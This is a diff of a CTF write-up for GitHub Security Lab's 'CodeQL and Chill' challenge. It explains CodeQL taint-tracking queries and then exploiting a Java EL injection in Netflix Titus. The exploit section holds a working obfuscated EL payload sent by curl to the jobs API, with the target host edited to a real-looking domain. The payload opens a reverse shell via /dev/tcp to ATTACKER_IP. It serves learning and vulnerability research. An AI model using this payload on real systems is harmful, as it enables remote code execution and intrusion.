@@ -1,6 +1,16 @@
+# GitHub Security Lab CTF 4: CodeQL and Chill - The Java Edition
 
-For explaining Step 1-3 I'll be giving the relevant, commented portion of the query for each step. A brief explanation will be there if needed.
-All the raw queries that I developed sequentially while solving the steps are available in [codeql/](codeql/)(One _may_ find an easter egg or two there).
+It was one heck of a challenge, I got to learn a hell lot and that's what matters the most :) ... 
+
+### A brief description of the challenge
+The Github Security team found a [SSTI RCE bug](https://securitylab.github.com/advisories/GHSL-2020-028-netflix-titus) in Netflix's Container Management Platform, [Titus Control Panel](https://github.com/Netflix/titus-control-plane/) and this CTF is modelled upon how one can find it and other similar bugs.  
+
+Find the CTF [here](https://securitylab.github.com/ctf/codeql-and-chill) and this report is a summary of how I dealt with all the steps.  
+
+
+
+For explaining Step 1-3 I'll be giving the relevant, commented portion of the query for each step. A brief explanation will be there if needed.  
+All the raw queries that I developed sequentially while solving the steps are available in [codeql/](codeql/) (One _may_ find an easter egg or two there).
 
 ## Step 1: Data flow and taint tracking analysis
 
@@ -103,14 +113,14 @@ Running Query gives-
 
 ### Step 1.5: Identifying a missing taint step
 
-This step required me to talk!?!?!
+This step requires me to talk!?!?!  
 So be it ¯\\\_(ツ)\_/¯
 
 The first 4 results in the previous step concern us, so lets have a look at them-
 
 ![Partial Query Locations](images/query/1.4.locs.png)
 
-It can be seen that taint doesn't propagate through methods `getHardConstraints` and `getSoftConstraints` and my sixth sense says that the same would happen for `keySet`
+It can be seen that taint doesn't propagate through methods `getHardConstraints` and `getSoftConstraints` and my sixth sense says that the same would happen for `keySet`  
 
 Now that I've found the beast, It is time to kill it!
 
@@ -296,6 +306,8 @@ Let me try showing what a diff between the 2 queries would look like-
     select sink, source, sink, "Custom constraint error message contains unsanitized user data"
 ```
 
+Find the full query [here](codeql/2.ql)
+
 Running Query-
 
 ![1 Result](images/query/2.png)
@@ -318,8 +330,8 @@ try {
 ```
 If `parse` throws an exception which is caught as `e` then `step` should spread the taint from both `a` and `b` to `e.getMessage()` as the cause can be `a` as well.
 
-For the heuristic to select the method;
-My first thought was that the method should return something out of the exception so I went through [the docs page for the Exception class](https://docs.oracle.com/javase/8/docs/api/java/lang/Exception.html) and found that these functions could return something useful -`getCause`, `getLocalisedMessage`, `getMessage`, `toString`. This is where I also observed something, three of them begin with `get` leading to me finding about the `GetterMethod` in codeql.
+For the heuristic to select the method;  
+My first thought was that the method should return something out of the exception so I went through [the docs page for the Exception class](https://docs.oracle.com/javase/8/docs/api/java/lang/Exception.html) and found that these functions could return something useful -`getCause`, `getLocalisedMessage`, `getMessage`, `toString`. This is where I also observed something, three of them begin with `get` leading to me finding about the `GetterMethod` in codeql.  
 Though the description of `GetterMethod` didn't seem promising-
 
 > A getter method is a method with the following properties:
@@ -327,20 +339,20 @@ Though the description of `GetterMethod` didn't seem promising-
 > - it has no parameters,
 > - its body contains exactly one statement that returns the value of a field.
 
-Though it is clear that those 3 methods will be doing some processing than these 3 properties restrict and there is a very very small chance that a custom `Exception` would override them to make them a `GetterMethod`. I still had a go with it being heuristic and got 0 results :p.
+It is clear that those 3 methods will be doing some processing than these 3 properties restrict and there is a very very small chance that a custom `Exception` would override them to make them a `GetterMethod`. I still had a go with it being heuristic and got 0 results :p.
 
-Now I though in the direction of... These 'get%' patterned Exception methods do stuff and return it so there ought to be more such patterned methods in the custom exceptions. Basically I took the advantage of the good naming practices people follow while coding in Java :p.
+Now here is a recreation of my next thoughts... These "get%" patterned Exception methods do stuff and return it so there ought to be more such patterned methods in the custom exceptions. Basically I took the advantage of the good naming practices people follow while coding in Java :p.
 
 Hence my final Heuristic is-
 
-- The method name should not be `getStackTrace`, `getSuppressed`, since they return useless things
-AND
-(
-  - The method name should follow the pattern `get%` or `Get%` or be `toString`
+- The method name should not be `getStackTrace`, `getSuppressed`, since they return useless things  
+AND  
+(  
+- The method name should follow the pattern `get%` or `Get%` or be `toString`
 
-  OR
+OR
 
-  - The method should be a `GetterMethod`, though this doesn't gice any results in our case there is still that very very small possibility it might work somewhere, someday.
+- The method should be a `GetterMethod`, though this doesn't gice any results in our case there is still that very very small possibility it might work somewhere, someday.
 )
 
 Withough further ado, here is the new class that was added-
@@ -417,13 +429,13 @@ ncat -k -l -p 2222
 #### Step 2
 Now run this curl request from anywhere and replace HOST_IP and ATTACKER_IP
 ```bash
-    curl --location --request POST 'HOST_IP:7001/api/v3/jobs' \
+    curl --location --request POST 'sinpi.wtf:7001/api/v3/jobs' \
     --header 'Content-Type: application/json' \
     --data-raw '{
         "container": {
             "softConstraints": {
                 "constraints": {
-                    "#{'\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.1cript2ngine3anager'\''.replace('\''1'\'', 83).replace('\''2'\'', 69).replace('\''3'\'', 77))).class.methods[1].invoke('\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.1cript2ngine3anager'\''.replace('\''1'\'', 83).replace('\''2'\'', 69).replace('\''3'\'', 77))), '\''js'\'').class.methods[7].invoke('\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.1cript2ngine3anager'\''.replace('\''1'\'', 83).replace('\''2'\'', 69).replace('\''3'\'', 77))).class.methods[1].invoke('\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.1cript2ngine3anager'\''.replace('\''1'\'', 83).replace('\''2'\'', 69).replace('\''3'\'', 77))), '\''js'\''), '\''1'\'').class.methods[3].invoke('\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.1cript2ngine3anager'\''.replace('\''1'\'', 83).replace('\''2'\'', 69).replace('\''3'\'', 77))).class.methods[1].invoke('\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.1cript2ngine3anager'\''.replace('\''1'\'', 83).replace('\''2'\'', 69).replace('\''3'\'', 77))), '\''js'\'').class.methods[7].invoke('\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.1cript2ngine3anager'\''.replace('\''1'\'', 83).replace('\''2'\'', 69).replace('\''3'\'', 77))).class.methods[1].invoke('\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.1cript2ngine3anager'\''.replace('\''1'\'', 83).replace('\''2'\'', 69).replace('\''3'\'', 77))), '\''js'\''), '\''java.lang.8untime.get9untime().exec(\" /bin/bash -c 'sh\</dev/tcp/ATTACKER_IP/5060\>/dev/tcp/ATTACKER_IP/2222' \")'\''.replace('\''8'\'', 82).replace('\''9'\'', 82))) + '\'''\''}": "lol"
+                    "#{'\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.1cript2ngine3anager'\''.replace('\''1'\'', 83).replace('\''2'\'', 69).replace('\''3'\'', 77))).class.methods[1].invoke('\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.1cript2ngine3anager'\''.replace('\''1'\'', 83).replace('\''2'\'', 69).replace('\''3'\'', 77))), '\''js'\'').class.methods[7].invoke('\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.1cript2ngine3anager'\''.replace('\''1'\'', 83).replace('\''2'\'', 69).replace('\''3'\'', 77))).class.methods[1].invoke('\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.1cript2ngine3anager'\''.replace('\''1'\'', 83).replace('\''2'\'', 69).replace('\''3'\'', 77))), '\''js'\''), '\''1'\'').class.methods[3].invoke('\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.1cript2ngine3anager'\''.replace('\''1'\'', 83).replace('\''2'\'', 69).replace('\''3'\'', 77))).class.methods[1].invoke('\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.1cript2ngine3anager'\''.replace('\''1'\'', 83).replace('\''2'\'', 69).replace('\''3'\'', 77))), '\''js'\'').class.methods[7].invoke('\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.1cript2ngine3anager'\''.replace('\''1'\'', 83).replace('\''2'\'', 69).replace('\''3'\'', 77))).class.methods[1].invoke('\'''\''.class.class.methods[14].invoke('\'''\''.class.class.methods[0].invoke('\'''\''.class, '\''javax.script.1cript2ngine3anager'\''.replace('\''1'\'', 83).replace('\''2'\'', 69).replace('\''3'\'', 77))), '\''js'\''), '\''java.lang.8untime.get9untime().exec(\" /bin/bash -c 'sh\</dev/tcp/ATTACKER_IP/5060\>/dev/tcp/ATTACKER_IP/2222' \")'\''.replace('\''8'\'', 82).replace('\''9'\'', 82))) + '\'''\''}": "IWantRickRollHereButIAmScared"
                 }
             }
         },
@@ -451,13 +463,14 @@ Run any `sh` command into the `5060` ncat connection
 
 #### So what does that all gobbled up thingy do?
 
-First step- How did I figured this JSON and the endpoint out. Thanks to netflix, they have a complete API documentation in their [titus-api-definitions](https://github.com/Netflix/titus-api-definitions) repository. The CodeQL shenanigans showed vulnerability in the constraint validator of the fields `softConstraints` and `hardConstraints` of Container class. So, if there's an endpoint that deserializes user controlled Container class, I get one step closer to RCE. One such enpoint is the endpoint that creates jobs using Job Descriptors, which in turn contains a Container - Bingo. All I had to do was to convert this [protobuf specification](https://github.com/Netflix/titus-api-definitions/blob/master/src/main/proto/netflix/titus/titus_job_api.proto) to REST JSON.
+Baby Steps- How did I figured this JSON and the endpoint out? 
+Thanks to netflix, they have a complete API documentation in their [titus-api-definitions](https://github.com/Netflix/titus-api-definitions) repository. The CodeQL shenanigans showed vulnerability in the constraint validator of the fields `softConstraints` and `hardConstraints` of Container class. So, if there's an endpoint that deserializes user controlled Container class, I get one step closer to RCE. One such enpoint is the endpoint that creates jobs using Job Descriptors, which in turn contains a Container - Bingo. All I had to do was to convert this [protobuf specification](https://github.com/Netflix/titus-api-definitions/blob/master/src/main/proto/netflix/titus/titus_job_api.proto) to REST JSON.
 
-It is time for me to know more about Java EL Injection and [this awesome report](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf) on exploit DB taught me all.
+Now it is time for me to know more about Java EL Injection and [this awesome report](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf) on exploit DB taught me all.
 
 After experimenting I observed that only Deferred EL Expressions seem to work and they are rather troublesome to work with. The main problem being-
 
-> Deferred evaluation expressions take the form #{expr} and can be evaluated at other phases of a page lifecycle as defined by whatever technology is using the expression.
+> Deferred evaluation expressions take the form #{expr} and can be evaluated at other phases of a page lifecycle as defined by whatever technology is using the expression.  
 [Oracle Docs](https://docs.oracle.com/javaee/6/tutorial/doc/bnahr.html)
 
 So I cannot use Multiple line payloads...
@@ -479,9 +492,11 @@ System.out.println(1 + " one");
 Next blocker is that sending UpperCase letters in the payload seems to break everything, probably everything is being converted to lowercase before execution. But there's a workaround for this ~(＾◇^)/. To see that let me clean up the relevant part of my payload first.
 
 ```java
-''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')).class.getBindings.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')), 'js').class.registerEngineMimeType.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')).class.getBindings.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')), 'js'), '1').class.getEngineByExtension.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')).class.getBindings.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')), 'js').class.registerEngineMimeType.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')).class.getBindings.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')), 'js'), 'java.lang.Runtime.getRuntime().exec(\" /bin/bash -c sh</dev/tcp/ATTACKER_IP/5060>/dev/tcp/ATTACKER_IP/2222 \")')'
-```
-
+''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')).class.getBindings.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')), 'js').class.registerEngineMimeType.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')).class.getBindings.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')), 'js'), '1').class.getEngineByExtension.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')).class.getBindings.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')), 'js').class.registerEngineMimeType.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')).class.getBindings.invoke(''.class.class.newInstance.invoke(''.class.class.forName.invoke(''.class, 'javax.script.ScriptEngineManager')), 'js'), 'java.lang.Runtime.getRuntime().exec(\" /bin/bash -c 'sh</dev/tcp/ATTACKER_IP/5060>/dev/tcp/ATTACKER_IP/2222' \")')'
+``` 
+ 
+_That's a lot of Reflection_
+ 
 Which is a twisted way to run-
 ```java
 ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"/bin/bash -c sh</dev/tcp/ATTACKER_IP/5060>/dev/tcp/ATTACKER_IP/2222\\\")"))}'
@@ -529,4 +544,9 @@ After getting `exec()` working I faced another blocker, `sh` doesn't give input 
 ```bash
 sh</dev/tcp/xxxx.pl/5060>/dev/tcp/xxxx.pl/2222
 ```
-This gave me an ez RCE as the `exec()` process is spawned as an independent process and I could freely communicate with `sh` over network :)
+This gave me an ez RCE as the `exec()` process is spawned as an independent process and I could freely communicate with `sh` over network :)  
+ 
+Why I need `/bin/bash` there you ask?
+
+![meme](https://media1.tenor.com/images/24467e83309d18fa430340084a7d7ec1/tenor.gif)  
+
